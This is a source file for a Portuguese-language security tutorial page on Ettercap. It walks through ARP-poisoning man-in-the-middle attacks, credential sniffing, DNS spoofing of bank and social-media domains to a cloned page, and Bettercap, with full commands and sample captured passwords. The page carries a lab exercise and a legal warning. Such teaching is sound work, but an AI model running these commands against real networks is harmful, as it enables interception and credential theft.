import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Ettercap() {
  return (
    <PageContainer
      title="Ettercap — MITM clássico"
      subtitle="ARP poisoning, sniffing de credenciais HTTP/FTP/Telnet, DNS spoof, plugins. Padrão histórico para MITM em LAN."
      difficulty="intermediario"
      timeToRead="16 min"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ettercap-graphical já vem no Kali (kali-tools-sniffing)",
            cmd: "sudo apt install -y ettercap-graphical ettercap-text-only",
            out: `Reading package lists... Done
ettercap-graphical is already the newest version (1:0.8.3.1-12).
ettercap-text-only is already the newest version (1:0.8.3.1-12).
0 upgraded, 0 newly installed, 0 to remove.`,
            outType: "muted",
          },
          {
            cmd: "ettercap -v",
            out: `ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team`,
            outType: "info",
          },
          {
            comment: "habilitar IP forwarding (ESSENCIAL para MITM não derrubar a rede)",
            cmd: "sudo sysctl -w net.ipv4.ip_forward=1",
            out: "net.ipv4.ip_forward = 1",
            outType: "success",
          },
        ]}
      />

      <h2>Modos de operação</h2>
      <CommandTable
        title="ettercap [opções]"
        variations={[
          { cmd: "-T", desc: "Text mode (terminal interativo).", output: "Recomendado para script." },
          { cmd: "-G", desc: "Graphical mode (GTK).", output: "Apontar e clicar." },
          { cmd: "-C", desc: "Curses mode (ncurses).", output: "Visual, sem GUI." },
          { cmd: "-D", desc: "Daemon mode (background).", output: "Para automação." },
          { cmd: "-i wlan0", desc: "Interface alvo.", output: "Padrão = 1ª ativa." },
          { cmd: "-q", desc: "Quiet (não imprime pacotes capturados).", output: "Só log final." },
          { cmd: "-w captura.pcap", desc: "Salva traffego em pcap.", output: "Para análise no Wireshark depois." },
          { cmd: "-M arp:remote", desc: "MITM ARP poisoning bidirecional.", output: "O ataque clássico." },
          { cmd: "-M dhcp", desc: "MITM via DHCP spoofing.", output: "Atribui IP+gateway falso." },
          { cmd: "-P plugin", desc: "Carrega um plugin.", output: "dns_spoof, repoison_arp etc." },
          { cmd: "//", desc: "Alvo TODOS os hosts.", output: "Ex: -M arp:remote /// (= todos / todos)." },
          { cmd: "/192.168.1.1//", desc: "Target1 = só esse IP.", output: "Geralmente o gateway." },
        ]}
      />

      <h2>Recon — descobrir hosts da LAN</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "scan rápido em modo texto, sem MITM ainda",
            cmd: "sudo ettercap -T -q -i wlan0 -P scan //",
            out: `ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
  wlan0 -> 08:00:27:DE:AD:BE
          192.168.1.107/255.255.255.0
          fe80::a00:27ff:fede:adbe/64

Privileges dropped to EUID 65534 EGID 65534...

  33 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

5 hosts added to the hosts list...

  192.168.1.1   00:50:56:C0:00:01    (router.local)
  192.168.1.50  00:0C:29:8A:1B:4F    (target.local)
  192.168.1.108 BC:5F:F4:33:42:E0    (laptop-ana)
  192.168.1.131 D4:25:CC:88:11:9A    (smart-tv)
  192.168.1.150 7C:50:79:11:42:80    (printer-hp)`,
            outType: "info",
          },
        ]}
      />

      <h2>ARP poisoning — gateway ↔ vítima</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "MITM clássico: vítima 192.168.1.50 ↔ gateway 192.168.1.1",
            cmd: "sudo ettercap -T -q -i wlan0 -M arp:remote /192.168.1.50// /192.168.1.1//",
            out: `ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
  wlan0 -> 08:00:27:DE:AD:BE
          192.168.1.107/255.255.255.0

Scanning for merged targets (2 hosts)...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

  GROUP 1 : 192.168.1.50 00:0C:29:8A:1B:4F
  GROUP 2 : 192.168.1.1  00:50:56:C0:00:01

Starting Unified sniffing...

Text only Interface activated...
Hit 'h' for inline help

HTTP : 23.96.42.111:80 -> USER: jose@email.com  PASS: SenhaFraca123  INFO: http://login.exemplo.com/auth
FTP  : 192.168.1.50:21 -> USER: anonymous       PASS: anonymous@
TELNET: 192.168.1.131:23 -> USER: admin         PASS: admin              ← smart TV pwn
SMTP : 192.168.1.50:25 -> USER: jose@empresa.com  PASS: empresa2025`,
            outType: "warning",
          },
        ]}
      />

      <AlertBox type="info" title="Por que arp:remote ?">
        <code>arp:remote</code> envia ARP forjados para os DOIS lados (vítima → "eu sou o gateway", gateway → "eu sou a vítima").
        Sem o <code>:remote</code>, só envenena o cache da vítima, e a resposta do gateway não passa por você.
      </AlertBox>

      <h2>DNS spoofing</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) editar o arquivo de regras do plugin dns_spoof",
            cmd: "sudo nano /etc/ettercap/etter.dns",
            out: "(abre editor)",
            outType: "muted",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="/etc/ettercap/etter.dns — redirecionar tudo para o atacante"
        code={`# linhas no formato:  hostname    TIPO    resposta
# coringa: *.dominio = qualquer subdomínio

facebook.com       A   192.168.1.107
*.facebook.com     A   192.168.1.107
www.banco.com.br   A   192.168.1.107
*.banco.com.br     A   192.168.1.107
google.com         A   192.168.1.107
*.google.com       A   192.168.1.107

# wildcard total (pega TUDO — quebra a internet da vítima):
# *                A   192.168.1.107`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "2) subir o atacante (apache na porta 80 com página clone)",
            cmd: "sudo systemctl start apache2",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "3) MITM + dns_spoof num só comando",
            cmd: "sudo ettercap -T -q -i wlan0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//",
            out: `[...]
Activating dns_spoof plugin...

dns_spoof: A [www.banco.com.br] spoofed to [192.168.1.107]
dns_spoof: A [facebook.com] spoofed to [192.168.1.107]
dns_spoof: A [www.facebook.com] spoofed to [192.168.1.107]

HTTP : 192.168.1.107:80 -> USER: vitima  PASS: minhasenha  INFO: http://www.banco.com.br/login`,
            outType: "error",
          },
        ]}
      />

      <h2>Salvar traffego (PCAP) para Wireshark</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo ettercap -T -q -i wlan0 -w captura.pcap -M arp:remote /192.168.1.50// /192.168.1.1//",
            out: "(captura tudo o que passa pelo MITM em captura.pcap. Use Ctrl+C para parar.)",
            outType: "muted",
          },
          {
            cmd: "ls -la captura.pcap && capinfos captura.pcap | head",
            out: `-rw-r--r-- 1 root root 14274318 Apr  3 17:21 captura.pcap

File name:           captura.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
Number of packets:   18,142
File size:           14 MB
Data size:           13 MB
Capture duration:    312.41 seconds
Start time:          2026-04-03 17:16:09 BRT
End time:            2026-04-03 17:21:21 BRT
Average packet rate: 58 packets/s
Average packet size: 758 bytes`,
            outType: "info",
          },
          {
            cmd: "wireshark captura.pcap &",
            out: "(abre Wireshark gráfico para análise)",
            outType: "default",
          },
        ]}
      />

      <h2>Plugins úteis</h2>
      <CommandTable
        title="-P <plugin>"
        variations={[
          { cmd: "dns_spoof", desc: "Reescreve respostas DNS (etter.dns).", output: "Manda vítima para servidor falso." },
          { cmd: "remote_browser", desc: "Mostra URL que cada vítima está visitando.", output: "Live URL feed." },
          { cmd: "find_conn", desc: "Mostra todas as conexões TCP da vítima.", output: "Lista IPs:portas." },
          { cmd: "autoadd", desc: "Adiciona automaticamente novos hosts ao alvo.", output: "Para LAN dinâmica." },
          { cmd: "repoison_arp", desc: "Re-envia ARP a cada N seg (mantém envenenamento).", output: "Contra cache que limpa rápido." },
          { cmd: "search_promisc", desc: "Detecta outras placas em modo promíscuo.", output: "Acha outros sniffers na LAN." },
          { cmd: "sslstrip", desc: "Remove HTTPS de redirects HTTP→HTTPS.", output: "Hoje quebrado por HSTS." },
          { cmd: "scan", desc: "Faz só scan da LAN (sem MITM).", output: "Como vimos no recon acima." },
        ]}
      />

      <h2>Modo gráfico (mais fácil)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo ettercap -G",
            out: `(abre janela GTK do ettercap)

  1) Sniff → Unified sniffing → wlan0 [OK]
  2) Hosts → Scan for hosts
  3) Hosts → Hosts list
  4) selecione 192.168.1.50 → Add to Target 1
  5) selecione 192.168.1.1  → Add to Target 2
  6) Mitm → ARP poisoning... → marque "Sniff remote connections" → OK
  7) Plugins → Manage plugins → duplo-click em dns_spoof
  8) Start → Start sniffing

  → no painel inferior aparece tudo capturado`,
            outType: "muted",
          },
        ]}
      />

      <h2>Bettercap — sucessor moderno</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ettercap está em manutenção. Para uso atual, use bettercap (mesmo conceito, MUITO melhor)",
            cmd: "sudo apt install -y bettercap && sudo bettercap -iface wlan0",
            out: `bettercap v2.32.0 (built for linux amd64 with go1.21.5) [type 'help' for a list of commands]

192.168.1.0/24 > 192.168.1.107 » net.probe on
192.168.1.0/24 > 192.168.1.107 » net.recon on
192.168.1.0/24 > 192.168.1.107 » set arp.spoof.fullduplex true
192.168.1.0/24 > 192.168.1.107 » set arp.spoof.targets 192.168.1.50
192.168.1.0/24 > 192.168.1.107 » arp.spoof on
192.168.1.0/24 > 192.168.1.107 » net.sniff on

[net.sniff] [200] http://login.exemplo.com/auth POST → user=jose&pass=Senha123
[net.sniff] [tcp] 192.168.1.50:53122 → 8.8.8.8:53 dns query "www.banco.com.br"
[arp.spoof] sending 32 ARP packets to 192.168.1.50 (00:0C:29:8A:1B:4F)`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="MITM no SEU laptop em laboratório"
        goal="Validar que ettercap captura tráfego HTTP do seu próprio PC."
        steps={[
          "Use 2 máquinas suas na mesma LAN: Kali (atacante) + outro (vítima).",
          "Habilite ip_forward para não derrubar a rede da vítima.",
          "Suba ettercap em modo texto com -M arp:remote.",
          "Na vítima abra http://testphp.vulnweb.com/login.php (HTTP plain).",
          "Volte ao ettercap e veja a credencial USER/PASS aparecer.",
          "PARE com Ctrl+C — ettercap restaura o ARP automaticamente.",
        ]}
        command={`sudo sysctl -w net.ipv4.ip_forward=1
sudo ettercap -T -q -i wlan0 -M arp:remote /IP_DA_VITIMA// /IP_DO_GATEWAY//
# (na vítima: navegar em http://testphp.vulnweb.com/login.php)
# (de volta no ettercap)
# Ctrl+C para parar`}
        expected={`HTTP : 44.228.249.3:80 -> USER: test  PASS: test  INFO: http://testphp.vulnweb.com/userinfo.php`}
        verify="Vítima continua navegando normal (não derrubou). Após Ctrl+C, ettercap envia ARPs limpos automaticamente."
      />

      <AlertBox type="danger" title="Ilegal fora da sua rede">
        ARP poisoning intercepta tráfego de outras pessoas — interceptação de comunicações
        é crime no BR (lei 9.296/96, lei 12.737/12). Use SÓ em sua própria rede de teste,
        em pentest com contrato, ou em CTF.
      </AlertBox>

      <AlertBox type="warning" title="HTTPS quebrou o ettercap clássico">
        Hoje 95% do tráfego é HTTPS — você vê só os IPs/portas/SNI, não o conteúdo. Para
        ataques modernos use <a href="#/wifiphisher"><strong>Wifiphisher</strong></a> (evil twin com captive portal)
        ou Bettercap com módulo <code>https.proxy</code> + cert auto-instalado na vítima.
      </AlertBox>
    </PageContainer>
  );
}
